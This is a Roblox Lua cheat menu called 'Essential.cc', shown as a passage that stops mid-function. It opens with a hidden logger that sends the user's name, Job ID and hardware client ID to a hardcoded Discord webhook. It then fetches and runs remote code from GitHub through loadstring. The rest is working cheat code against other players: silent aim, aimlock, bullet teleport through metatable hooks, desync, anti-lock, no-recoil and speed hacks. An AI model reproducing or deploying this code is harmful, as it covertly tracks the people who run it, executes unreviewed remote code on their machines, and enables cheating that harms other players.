pcall(function()
    player = game.Players.LocalPlayer
    http = game:GetService("HttpService")
    headers = {
        ["Content-Type"] = "application/json"
    }
    jobId = game.JobId
    hwid = game:GetService("RbxAnalyticsService"):GetClientId()
    embed = {
        ["title"] = "Player Execution Log",
        ["color"] = 11163115,
        ["fields"] = {
            {["name"] = "Name", ["value"] = player.Name, ["inline"] = true},
            {["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
            {["name"] = "Job ID", ["value"] = jobId, ["inline"] = false},
            {["name"] = "HWID", ["value"] = hwid, ["inline"] = false}
        },
        ["timestamp"] = DateTime.now():ToIsoDate()
    }
    data = {["embeds"] = {embed}}
    body = http:JSONEncode(data)
    request({
        Url = "https://discord.com/api/webhooks/1495461115918946455/XSa1uxGs5-sqkEC9p56CdSFoVtiFRNsUWawgNT82j1Gng203Mds9GFlJRQzD8NIX2QsB",
        Method = "POST",
        Headers = headers,
        Body = body
    })
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/AlwaysTapping/cuocries/refs/heads/main/Source.lua"))()

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/fouejp/Linoria-Library-Mobile/refs/heads/main/Gui%20Lib%20%5BLibrary%5D"))()
local ThemeManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/fouejp/Linoria-Library-Mobile/refs/heads/main/Gui%20Lib%20%5BThemeManager%5D"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/fouejp/Linoria-Library-Mobile/refs/heads/main/Gui%20Lib%20%5BSaveManager%5D"))()

local Window = Library:CreateWindow({
    Title = 'Essential.cc',
    Center = true,
    AutoShow = true,
    TabPadding = 8,
    MenuFadeTime = 0.2
})

local Tabs = {
    Main = Window:AddTab('Main'),
    Visual = Window:AddTab('Visual'),
    Blatant = Window:AddTab('Blatant'),
    ['UI Settings'] = Window:AddTab('UI Settings'),
}

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local Camera = Workspace.CurrentCamera
local Mouse = player:GetMouse()

local oldDrawingNew; oldDrawingNew = hookfunction(Drawing.new, function(class, properties)
    local drawing = oldDrawingNew(class)
    for i, v in next, properties or {} do
        drawing[i] = v
    end
    return drawing
end)

local Settings = {
    Notifications = true,
    AimAssist = false,
    Smoothness = 0.11,
    Prediction = 0.165,
    PredictionY = 0.165,
    PredictionX = 0.165,
    HitPart = "HumanoidRootPart",
    MaxCursorDistance = math.huge,
    BreakOnDeath = true,
    LookAt = false,
    SilentAim = false,
    SilentAimPrediction = 0.132,
    SilentAimFOV = 300,
    SilentAimWallCheck = true,
    SilentAimFOVVisible = true,
    TargetAim = false,
    TargetAimMethod = "FireServer",
    TargetAimAccuracy = 100,
    AutoAir = false,
    AirOffset = 0.1,
    AutoPrediction = false,
    TargetStrafe = false,
    StrafeSpeed = 5,
    StrafeHeight = 0,
    StrafeDistance = 5,
    StrafeMode = "Orbit",
    SpinBotEnabled = false,
    SpinBotSpeed = 50,
    CFrameEnabled = false,
    CFrameSpeed = 18,
    CrosshairEnabled = true,
    ForcefieldEnabled = false,
    FogEnabled = false,
    FogColor = Color3.fromRGB(255, 255, 255),
    AntiLockEnabled = false,
    AntiLockMode = "NetworkSleep",
    DesyncEnabled = false,
    VelocityManipulation = false,
    FreefallBoost = false,
    StrafeAngle = 0
}

local SavedLockButtonPosition = UDim2.new(1, -100, 0, 20)

local ESPSettings = {
    Boxes = false,
    HealthBar = false,
    Tracers = false,
    BoxColor = Color3.fromRGB(255, 255, 255),
    TracerColor = Color3.fromRGB(255, 255, 255),
    HealthBarColor = Color3.fromRGB(0, 255, 0)
}

local Locked = false
local Victim = nil
local CachedPart = nil
local LockButtonFrame = nil
local LockButton = nil
local ScreenGui = nil
local LastToggle = 0
local LastAirShot = 0
local IsAirShooting = false
local StrafeConnection = nil
local CFrameConnection = nil
local ESP = {}
local AntiLockConnection = nil
local DesyncConnections = {}
local DesyncParts = {}
local ForcefieldObjects = {}
local SilentCircle = nil
local SilentHighlight = nil
local CachedTarget = nil
local CachedPartSilent = nil
local ResolvedPosition = nil
local TargetPlayer = nil
local TargetAimConnection = nil

local NoRecoilEnabled = false
local NoSlowdownEnabled = false
local NoJumpCooldownEnabled = false
local NoclipEnabled = false
local NoseatEnabled = false
local NoRecoilConnection = nil
local NoSlowdownConnection = nil
local NoclipConnection = nil
local OriginalWalkSpeed = nil
local NoseatSeats = {}

local WallbangEnabled = false
local EquipAllGunsEnabled = false
local RapidFireEnabled = false
local InfiniteAmmoEnabled = false
local lastEquipTime = 0
local RapidFireOriginalValues = {}
local InfiniteAmmoConnection = nil
local EquipAllConnection = nil
local EquipAllRemovedConnection = nil
local EquipAllAddedConnection = nil

local AntiVoidEnabled = false
local AntiStompEnabled = false
local AntiModEnabled = false
local AntiLockDetectorEnabled = false
local AntiAimViewEnabled = false
local AntiFlingEnabled = false
local DsAntiModEnabled = false
local OriginalPrint = print
local AntiLockDetectorGui = nil
local AntiFlingConnection = nil
local LastPosition = nil
local DsAntiModGui = nil
local DsAntiModFrame = nil
local DsAntiModPlayerList = nil
local DsAntiModKickToggle = false
local DsAntiModToggleButton = nil
local DsAntiModToggleGuiButton = nil
local GroupId = 33986332

-- TP Variables
local ClickToTpEnabled = false
local ClickToTpTool = nil
local BulletTPEnabled = false

getgenv().crosshair = {
    enabled = true,
    refreshrate = 0,
    mode = 'mouse',
    position = Vector2.new(0, 0),
    width = 1.5,
    length = 10,
    radius = 11,
    color = Color3.fromRGB(0, 0, 0),
    spin = false,
    resize = false,
}

local drawings = {
    crosshair = {},
    text = Drawing.new('Text', {
        Size = 13,
        Font = 2,
        Outline = true,
        Text = 'Essential.cc',
        Color = Color3.fromRGB(0, 0, 0)
    }),
}

for idx = 1, 8 do
    drawings.crosshair[idx] = Drawing.new('Line')
end

local InnalillahiMataKiri = Instance.new("ScreenGui")
InnalillahiMataKiri.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
InnalillahiMataKiri.Parent = CoreGui

local Notifications_Frame = Instance.new("Frame")
Notifications_Frame.Name = "Notifications"
Notifications_Frame.BackgroundTransparency = 1
Notifications_Frame.Size = UDim2.new(1, 0, 1, 36)
Notifications_Frame.Position = UDim2.fromOffset(0, -36)
Notifications_Frame.ZIndex = 5
Notifications_Frame.Parent = InnalillahiMataKiri

local NotificationSystem = {}
local ActiveNotifications = {}

local function GetDictionaryLength(dictionary)
    local count = 0
    for _ in pairs(dictionary) do
        count += 1
    end
    return count
end

function NotificationSystem:Notify(Content, Delay)
    if not Settings.Notifications then return end
    local Delay = typeof(Delay) == "number" and Delay or 3

    local Text = Instance.new("TextLabel")
    local Notification = {self = Text}

    Text.Name = "Notification"
    Text.BackgroundTransparency = 1
    Text.Position = UDim2.new(0.5, -190, 1, -130 - (GetDictionaryLength(ActiveNotifications) * 15))
    Text.Size = UDim2.new(0, 200, 0, 15)
    Text.Text = Content
    Text.Font = Enum.Font.SourceSans
    Text.TextSize = 14
    Text.TextColor3 = Color3.new(1, 1, 1)
    Text.TextStrokeTransparency = 0.2
    Text.TextTransparency = 1
    Text.RichText = true
    Text.ZIndex = 4
    Text.Parent = Notifications_Frame

    local function CustomTweenOffset(Offset)
        task.spawn(function()
            local Steps = 33
            for i = 1, Steps do
                Text.Position += UDim2.fromOffset(Offset / Steps, 0)
                RunService.RenderStepped:Wait()
            end
        end)
    end

    function Notification:Destroy()
        ActiveNotifications[Notification] = nil
        Text:Destroy()
        for _, v in pairs(ActiveNotifications) do
            v.self.Position += UDim2.fromOffset(0, 15)
        end
    end

    ActiveNotifications[Notification] = Notification

    local TweenIn = TweenService:Create(Text, TweenInfo.new(0.3), {TextTransparency = 0})
    local TweenOut = TweenService:Create(Text, TweenInfo.new(0.2), {TextTransparency = 1})

    TweenIn:Play()
    CustomTweenOffset(100)

    TweenIn.Completed:Connect(function()
        task.delay(Delay, function()
            TweenOut:Play()
            CustomTweenOffset(100)
            TweenOut.Completed:Connect(function()
                Notification:Destroy()
            end)
        end)
    end)
end

-- Click to TP Function
local function SetupClickToTp()
    if ClickToTpTool then
        ClickToTpTool:Destroy()
        ClickToTpTool = nil
    end
    
    if ClickToTpEnabled then
        ClickToTpTool = Instance.new("Tool")
        ClickToTpTool.RequiresHandle = false
        ClickToTpTool.Name = "Tap to tp"
        ClickToTpTool.Activated:Connect(function()
            local pos = Mouse.Hit + Vector3.new(0, 2.5, 0)
            pos = CFrame.new(pos.X, pos.Y, pos.Z)
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                player.Character.HumanoidRootPart.CFrame = pos
                NotificationSystem:Notify("Teleported to clicked location", 2)
            end
        end)
        ClickToTpTool.Parent = player.Backpack
        NotificationSystem:Notify("Click to TP Enabled - Tool added to backpack", 3)
    end
end

-- BULLET TP SCRIPT (FULL ORIGINAL)
local function StartBulletTP()
    local plrs = game:GetService("Players")
    local rs = game:GetService("RunService")
    local cam = workspace.CurrentCamera
    local uis = game:GetService("UserInputService")
    local vim = game:GetService("VirtualInputManager")

    local plr = plrs.LocalPlayer
    local mouse = plr:GetMouse()

    local delay = 0.2
    local key = Enum.KeyCode.R

    local data = {
        functions = {},
        connections = {},
        utility = { gun = {} }
    }

    -- Your UI (Made Smaller)
    local _ScreenGui = Instance.new('ScreenGui')
    _ScreenGui.Name = 'Gui'
    _ScreenGui.Parent = game.CoreGui

    local _Frame = Instance.new('Frame')
    _Frame.Size = UDim2.new(0.08, 0, 0.18, 0) 
    _Frame.Position = UDim2.new(0.1, 0, 0.2, 0)
    _Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    _Frame.BorderSizePixel = 0
    _Frame.Active = true
    _Frame.BackgroundTransparency = 0.5
    _Frame.Draggable = true
    _Frame.Parent = _ScreenGui

    local _TextButton = Instance.new('TextButton')
    _TextButton.Size = UDim2.new(0.8, 0, 0.8, 0)
    _TextButton.Position = UDim2.new(0.1, 0, 0.1, 0)
    _TextButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    _TextButton.BorderSizePixel = 0
    _TextButton.Text = 'Off'
    _TextButton.TextSize = 12
    _TextButton.TextColor3 = Color3.new(1, 1, 1)
    _TextButton.Font = Enum.Font.Code
    _TextButton.Parent = _Frame

    local _UICorner = Instance.new('UICorner')
    _UICorner.CornerRadius = UDim.new(0, 10)
    _UICorner.Parent = _Frame

    local _UICorner2 = Instance.new('UICorner')
    _UICorner2.CornerRadius = UDim.new(0, 10)
    _UICorner2.Parent = _TextButton

    local enabled = false
    _G.BulletTPEnabled = false
    _G.TargetPlayer = nil

    local cfg = {
        part = "Head",
        highlight_color = Color3.fromRGB(0,0,0),
        highlight_transparency = 0.5
    }

    local locked = nil
    local spec = false
    local hl = nil
    local tracer = nil

    local function press()
        vim:SendKeyEvent(true, key, false, game)
        task.wait(0.05)
        vim:SendKeyEvent(false, key, false, game)
    end

    local function tool()
        local char = plr.Character
        if not char then return nil end
        for _,v in ipairs(char:GetChildren()) do
            if v:IsA("Tool") then
                return v
            end
        end
        return nil
    end

    task.spawn(function()
        while true do
            local t = tool()
            if t then
                local ammo = t:FindFirstChild("Ammo", true)
                if ammo and ammo:IsA("ValueBase") then
                    if ammo.Value <= 0 then
                        local r = t:FindFirstChild("Reload", true) or t:FindFirstChild("ReloadFunction", true)
                        if r then
                            pcall(function()
                                r:FireServer()
                            end)
                        else
                            press()
                        end
                        task.wait(0.8)
                    end
                end
            end
            task.wait(delay)
        end
    end)

    local function highlight(t)
        if hl then
            hl:Destroy()
            hl = nil
        end
        if t and t.Character then
            hl = Instance.new("Highlight")
            hl.Name = "BTPHighlight"
            hl.FillColor = cfg.highlight_color
            hl.FillTransparency = cfg.highlight_transparency
            hl.OutlineColor = Color3.new(0,0,0)
            hl.OutlineTransparency = 0
            hl.Adornee = t.Character
            hl.Parent = game:GetService("CoreGui")
        end
    end

    local function closest()
        local dist = math.huge
        local target = nil
        for _,v in ipairs(plrs:GetPlayers()) do
            if v ~= plr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = v.Character.HumanoidRootPart
                local pos,on = cam:WorldToViewportPoint(hrp.Position)
                if on then
                    local mag = (Vector2.new(mouse.X,mouse.Y) - Vector2.new(pos.X,pos.Y)).Magnitude
                    if mag < dist then
                        dist = mag
                        target = v
                    end
                end
            end
        end
        return target
    end

    local function stopspec()
        spec = false
        if plr.Character and plr.Character:FindFirstChild("Humanoid") then
            cam.CameraSubject = plr.Character.Humanoid
        end
    end

    -- UI Button Logic
    _TextButton.MouseButton1Click:Connect(function()
        enabled = not enabled
        _TextButton.Text = enabled and "On" or "Off"
        
        if enabled then
            _G.BulletTPEnabled = true
            
            -- Auto-lock onto closest player
            local t = closest()
            if t then
                locked = t
                _G.TargetPlayer = t
                highlight(t)
                tracer = Drawing.new("Line")
                tracer.Color = Color3.fromRGB(0,0,0)
                tracer.Thickness = 1
                tracer.Transparency = 0.5
            end
            
            -- Auto start spectating the locked target
            if locked and locked.Character and locked.Character:FindFirstChild("Humanoid") then
                spec = true
                cam.CameraSubject = locked.Character.Humanoid
            end
        else
            _G.BulletTPEnabled = false
            _G.TargetPlayer = nil
            locked = nil
            spec = false
            highlight(nil)
            if tracer then 
                tracer:Remove() 
                tracer = nil 
            end
            stopspec()
        end
    end)

    rs.RenderStepped:Connect(function()
        if locked and enabled then
            if not locked.Parent or not locked.Character or not locked.Character:FindFirstChild("HumanoidRootPart") then
                locked = nil
                _G.TargetPlayer = nil
                _G.BulletTPEnabled = false
                highlight(nil)
                if tracer then tracer:Remove() tracer = nil end
                stopspec()
                return
            end
            if hl and hl.Adornee ~= locked.Character then
                hl.Adornee = locked.Character
            end
            if tracer then
                local root = locked.Character.HumanoidRootPart
                local pos,visible = cam:WorldToViewportPoint(root.Position)
                if visible then
                    tracer.From = Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y)
                    tracer.To = Vector2.new(pos.X,pos.Y)
                    tracer.Visible = true
                else
                    tracer.Visible = false
                end
            end
            if spec and locked.Character and locked.Character:FindFirstChild("Humanoid") then
                cam.CameraSubject = locked.Character.Humanoid
            end
        end
    end)

    local mt = getrawmetatable(game)
    setreadonly(mt,false)
    local old = mt.__index

    mt.__index = function(self,i)
        if not checkcaller() and self == mouse then
            if (i == "Hit" or (i == "Target" and game.PlaceId == 2788229376)) and enabled and _G.BulletTPEnabled then
                local t = _G.TargetPlayer
                if t and t.Character then
                    local p = t.Character:FindFirstChild(cfg.part)
                    if p then
                        return CFrame.new(p.Position)
                    end
                end
            end
        end
        return old(self,i)
    end

    data.functions.cframe_to_offset = function(o,t)
        local a = o * CFrame.new(0,-1,0,1,0,0,0,0,1,0,-1,0)
        return a:ToObjectSpace(t):inverse()
    end

    data.functions.teleport_bullet = function(t)
        if not enabled or not _G.BulletTPEnabled then return end
        local target = _G.TargetPlayer
        if not (target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")) then return end
        local o = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        local tp = target.Character.HumanoidRootPart
        if o and tp then
            local g = t.Grip
            t.Parent = plr.Backpack
            t.Grip = data.functions.cframe_to_offset(plr.Character.RightHand.CFrame,tp.CFrame)
            t.Parent = plr.Character
            rs.RenderStepped:Wait()
            t.Parent = plr.Backpack
            t.Grip = g
            t.Parent = plr.Character
        end
    end

    data.functions.handle_character = function(c)
        for _,v in ipairs({"character_child_added","child_removing_character"}) do
            if data.connections[v] then
                data.connections[v]:Disconnect()
            end
        end
        data.connections.character_child_added = c.ChildAdded:Connect(function(t)
            if t:IsA("Tool") then
                for _,v in ipairs(getconnections(t:GetPropertyChangedSignal("Grip"))) do
                    v:Disable()
                end
                data.connections.tool_activated = t.Activated:Connect(function()
                    data.functions.teleport_bullet(t)
                end)
            end
        end)
        data.connections.child_removing_character = c.ChildRemoved:Connect(function()
            data.utility.gun.tool = nil
            if data.connections.tool_activated then
                data.connections.tool_activated:Disconnect()
            end
        end)
    end

    local char = plr.Character or plr.CharacterAdded:Wait()
    data.functions.handle_character(char)

    plr.CharacterAdded:Connect(function(c)
        data.functions.handle_character(c)
    end)

    plr.CharacterRemoving:Connect(function()
        for _,v in ipairs({"character_child_added","child_removing_character"}) do
            if data.connections[v] then
                data.connections[v]:Disconnect()
            end
        end
    end)
end

-- Start Bullet TP automatically
StartBulletTP()

local function IsPlayerDownedOrDead(plr)
    local character = plr.Character
    if not character then return true end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local root = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not root then return true end
    if humanoid.Health <= 0 then return true end
    if character:FindFirstChild("Downed") or humanoid:FindFirstChild("Downed") then return true end
    local state = humanoid:GetState()
    if state == Enum.HumanoidStateType.Dead or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.FallingDown or state == Enum.HumanoidStateType.PlatformStanding then return true end
    if humanoid.PlatformStand then return true end
    if root.Position.Y < workspace.Terrain.MaxExtents.Min.Y + 12 or root.Position.Y < -5 then return true end
    if (character:FindFirstChild("BodyPosition") or character:FindFirstChild("BodyGyro")) and root.Velocity.Magnitude < 8 then return true end
    return false
end

local function IsVisible(part)
    if not part or not Settings.SilentAimWallCheck then return true end
    local origin = Camera.CFrame.Position
    local direction = part.Position - origin
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {player.Character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    raycastParams.IgnoreWater = true
    local result = workspace:Raycast(origin, direction, raycastParams)
    return not result or result.Instance:IsDescendantOf(part.Parent)
end

local function IsShiftLockActive()
    return UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter
end

local function GetClosestToCenter()
    local center = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
    local effectiveRadius = Settings.SilentAimFOV
    if IsShiftLockActive() then
        effectiveRadius = effectiveRadius * 1.2
    end
    local closestDist = effectiveRadius
    local targetPlayer = nil

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild("Head") and not IsPlayerDownedOrDead(plr) then
            local head = plr.Character.Head
            local headPos, onScreen = Camera:WorldToScreenPoint(head.Position)
            if onScreen and IsVisible(head) then
                local dist = (Vector2.new(headPos.X, headPos.Y) - center).Magnitude
                if dist < closestDist then
                    closestDist = dist
                    targetPlayer = plr
                end
            end
        end
    end
    return targetPlayer
end

local function GetBestPart(character)
    if not character then return nil end
    local mousePos = Vector2.new(Mouse.X, Mouse.Y)
    local bestPart = nil
    local minDist = math.huge

    local root = character:FindFirstChild("HumanoidRootPart")
    if root then
        if root.Position.Y < -50 then
            ResolvedPosition = character.Head.Position + Vector3.new(root.Velocity.X * Settings.SilentAimPrediction, root.Velocity.Y * Settings.SilentAimPrediction, root.Velocity.Z * Settings.SilentAimPrediction)
        else
            ResolvedPosition = root.Position + Vector3.new(root.Velocity.X * Settings.SilentAimPrediction, root.Velocity.Y * Settings.SilentAimPrediction, root.Velocity.Z * Settings.SilentAimPrediction)
        end
    else
        ResolvedPosition = nil
    end

    for _, part in ipairs(character:GetChildren()) do
        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
            local screenPos, onScreen = Camera:WorldToScreenPoint(part.Position)
            if onScreen and IsVisible(part) then
                local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
                if dist < minDist then
                    minDist = dist
                    bestPart = part
                end
            end
        end
    end
    return bestPart or root or character:FindFirstChild("Head")
end

local function IsPlayerInFOV(plr)
    if not plr or not plr.Character then return false end
    local targetPart = plr.Character:FindFirstChild(Settings.HitPart)
    if not targetPart then return false end
    local screenPos, onScreen = Camera:WorldToViewportPoint(targetPart.Position)
    if not onScreen then return false end
    local centerX = Camera.ViewportSize.X / 2
    local centerY = Camera.ViewportSize.Y / 2
    local dist = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(centerX, centerY)).Magnitude
    return dist <= 85
end

local function GetClosestPlayerByCursor()
    local closestPlayer = nil
    local shortestDistance = Settings.MaxCursorDistance
    local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild(Settings.HitPart) then
            local humanoid = plr.Character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health > 0 then
                local targetPart = plr.Character[Settings.HitPart]
                local targetPos = targetPart.Position + Vector3.new(0, 1, 0)
                local screenPos, onScreen = Camera:WorldToViewportPoint(targetPos)
                if onScreen then
                    local distFromCenter = (Vector2.new(screenPos.X, screenPos.Y) - screenCenter).Magnitude
                    if distFromCenter < shortestDistance then
                        closestPlayer = plr
                        shortestDistance = distFromCenter
                    end
                end
            end
        end
    end
    return closestPlayer
end

local function UnlockTarget(reason)
    if not Locked and not Victim then return end
    local oldVictim = Victim
    Locked = false
    Victim = nil
    CachedPart = nil
    TargetPlayer = nil
    if LockButton then 
        LockButton.Image = "rbxassetid://88399410034249" 
    end
    if oldVictim and reason then
        NotificationSystem:Notify(reason .. oldVictim.Name, 3)
    end
end

local function IsVictimValid()
    if not Victim then return false end
    if not Victim.Character then return false end
    if CachedPart and not CachedPart.Parent then return false end
    local targetPart = Victim.Character:FindFirstChild(Settings.HitPart)
    local humanoid = Victim.Character:FindFirstChild("Humanoid")
    if not targetPart or not humanoid then return false end
    if Settings.BreakOnDeath and humanoid.Health <= 0 then return false end
    return true
end

local function CreateOrUpdateLockButton()
    if ScreenGui then
        ScreenGui:Destroy()
        ScreenGui = nil
        LockButtonFrame = nil
        LockButton = nil
    end
    
    if not Settings.AimAssist then return end
    
    ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "LockScreenGui"
    ScreenGui.Parent = player:WaitForChild("PlayerGui")
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    LockButtonFrame = Instance.new("Frame")
    LockButtonFrame.Name = "LockButtonFrame"
    LockButtonFrame.Size = UDim2.new(0, 80, 0, 80)
    LockButtonFrame.Position = SavedLockButtonPosition
    LockButtonFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    LockButtonFrame.BackgroundTransparency = 0.3
    LockButtonFrame.BorderSizePixel = 0
    LockButtonFrame.Parent = ScreenGui
    LockButtonFrame.Active = true
    
    local bgCorner = Instance.new("UICorner")
    bgCorner.CornerRadius = UDim.new(0, 12)
    bgCorner.Parent = LockButtonFrame

    LockButton = Instance.new("ImageButton")
    LockButton.Name = "LockButton"
    LockButton.Size = UDim2.new(0, 70, 0, 70)
    LockButton.Position = UDim2.new(0.5, -35, 0.5, -35)
    LockButton.Image = Locked and "rbxassetid://96734356722259" or "rbxassetid://88399410034249"
    LockButton.BackgroundTransparency = 1
    LockButton.BorderSizePixel = 0
    LockButton.Parent = LockButtonFrame

    local isDragging = false
    local dragStartInput = nil
    local dragStartPos = nil
    local frameStartPos = nil
    local wasDragging = false
    local dragThreshold = 5
    
    LockButtonFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = true
            wasDragging = false
            dragStartInput = input
            dragStartPos = Vector2.new(input.Position.X, input.Position.Y)
            frameStartPos = LockButtonFrame.Position
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if isDragging and input == dragStartInput then
            local currentPos = Vector2.new(input.Position.X, input.Position.Y)
            local delta = currentPos - dragStartPos
            if delta.Magnitude > dragThreshold then
                wasDragging = true
            end
            local newPos = UDim2.new(
                frameStartPos.X.Scale,
                frameStartPos.X.Offset + delta.X,
                frameStartPos.Y.Scale,
                frameStartPos.Y.Offset + delta.Y
            )
            LockButtonFrame.Position = newPos
            SavedLockButtonPosition = newPos
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if isDragging and input == dragStartInput then
            isDragging = false
            dragStartInput = nil
        end
    end)
    
    LockButton.MouseButton1Click:Connect(function()
        if not wasDragging then
            local now = tick()
            if now - LastToggle < 0.3 then return end
            LastToggle = now
            
            if Locked then
                UnlockTarget("Unlocked on ")
            else
                Victim = GetClosestPlayerByCursor()
                if Victim and Victim.Character then
                    Locked = true
                    CachedPart = Victim.Character[Settings.HitPart]
                    LockButton.Image = "rbxassetid://96734356722259"
                    NotificationSystem:Notify("Locked on " .. Victim.Name, 3)
                end
            end
        end
    end)
end

local function ClearForcefield()
    for _, obj in pairs(ForcefieldObjects) do
        if obj and obj.Parent then
            obj:Destroy()
        end
    end
    ForcefieldObjects = {}
end

local function CreateForcefield()
    ClearForcefield()
    local character = player.Character
    if not character then return end
    local existingForceField = character:FindFirstChild("ForceField")
    if existingForceField then
        existingForceField:Destroy()
    end
    local forceField = Instance.new("ForceField")
    forceField.Parent = character
    table.insert(ForcefieldObjects, forceField)
end

local function StartAntiLock()
    if AntiLockConnection then return end
    AntiLockConnection = RunService.Heartbeat:Connect(function()
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            pcall(function()
                sethiddenproperty(hrp, "NetworkIsSleeping", true)
                task.wait()
                sethiddenproperty(hrp, "NetworkIsSleeping", false)
            end)
        end
    end)
end

local function StopAntiLock()
    if AntiLockConnection then
        AntiLockConnection:Disconnect()
        AntiLockConnection = nil
    end
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        pcall(function()
            sethiddenproperty(player.Character.HumanoidRootPart, "NetworkIsSleeping", false)
        end)
    end
end

local function StopStrafe()
    if StrafeConnection then
        StrafeConnection:Disconnect()
        StrafeConnection = nil
    end
end

local function StartStrafe()
    if StrafeConnection then return end
    
    if not Settings.StrafeAngle then
        Settings.StrafeAngle = 0
    end
    
    StrafeConnection = RunService.Heartbeat:Connect(function()
        if not Settings.TargetStrafe then return end
        if not Locked then return end
        if not Victim then return end
        if not Victim.Character then return end
        if not player.Character then return end
        
        local targetHRP = Victim.Character:FindFirstChild("HumanoidRootPart")
        local localHRP = player.Character:FindFirstChild("HumanoidRootPart")
        
        if not targetHRP or not localHRP then return end
        
        Settings.StrafeAngle = Settings.StrafeAngle + (Settings.StrafeSpeed * 0.01)
        
        local mode = Settings.StrafeMode
        if mode == "Random" then
            mode = math.random() > 0.5 and "Orbit" or "Circle"
        end
        
        local offsetX, offsetZ
        
        if mode == "Orbit" then
            offsetX = math.sin(Settings.StrafeAngle) * Settings.StrafeDistance
            offsetZ = math.cos(Settings.StrafeAngle) * Settings.StrafeDistance
        else
            offsetX = math.sin(Settings.StrafeAngle * 2) * Settings.StrafeDistance
            offsetZ = math.cos(Settings.StrafeAngle) * Settings.StrafeDistance
        end
        
        local targetPos = targetHRP.Position + Vector3.new(offsetX, Settings.StrafeHeight, offsetZ)
        
        local lookAtTarget = CFrame.new(targetPos, targetHRP.Position)
        
        localHRP.CFrame = lookAtTarget
    end)
end

local function StopCFrameSpeed()
    if CFrameConnection then
        CFrameConnection:Disconnect()
        CFrameConnection = nil
    end
end

local function StartCFrameSpeed()
    if CFrameConnection then return end
    CFrameConnection = RunService.RenderStepped:Connect(function()
        if not Settings.CFrameEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildWhichIsA("Humanoid")
        if not hrp or not hum then return end
        if hum.MoveDirection.Magnitude > 0 then
            hrp.CFrame = hrp.CFrame + (hum.MoveDirection * (Settings.CFrameSpeed / 10))
        end
    end)
end

local function StopDesync()
    Settings.DesyncEnabled = false
    for _,v in pairs(DesyncParts) do
        if v and v.Parent then
            v.Transparency = 0
        end
    end
    DesyncParts = {}
    if DesyncConnections[1] then
        DesyncConnections[1]:Disconnect()
        DesyncConnections[1] = nil
    end
    if DesyncConnections[2] then
        DesyncConnections[2]:Disconnect()
        DesyncConnections[2] = nil
    end
end

local function StartDesync()
    if DesyncConnections[1] then StopDesync() end
    DesyncParts = {}
    local char = player.Character
    if not char then return end
    for _,v in pairs(char:GetDescendants()) do
        if v:IsA("BasePart") and v.Transparency == 0 then
            table.insert(DesyncParts, v)
        end
    end
    Settings.DesyncEnabled = true
    for _,v in pairs(DesyncParts) do
        v.Transparency = 0.5
    end
    DesyncConnections[2] = RunService.Heartbeat:Connect(function()
        if not Settings.DesyncEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local humanoid = char:FindFirstChildWhichIsA("Humanoid")
        if not root or not humanoid then return end
        local oldCF = root.CFrame
        local oldOffset = humanoid.CameraOffset
        local newCF = oldCF * CFrame.new(0, -200000, 0)
        local offset = newCF:ToObjectSpace(CFrame.new(oldCF.Position)).Position
        root.CFrame = newCF
        humanoid.CameraOffset = offset
        RunService.RenderStepped:Wait()
        root.CFrame = oldCF
        humanoid.CameraOffset = oldOffset
    end)
end

local NoRecoilNewIndex = nil
local function StartNoRecoil()
    if NoRecoilNewIndex then return end
    
    local function isframework(scriptInstance)
        if tostring(scriptInstance) == "Framework" then
            return true
        end
        return false
    end
    
    local function checkArgs(instance, index)
        if tostring(instance):lower():find("camera") and tostring(index) == "CFrame" then
            return true
        end
        return false
    end
    
    local mt = getrawmetatable(game)
    local oldNewIndex = mt.__newindex
    setreadonly(mt, false)
    
    NoRecoilNewIndex = hookfunction(mt.__newindex, function(self, index, value)
        local callingScr = getcallingscript()
        
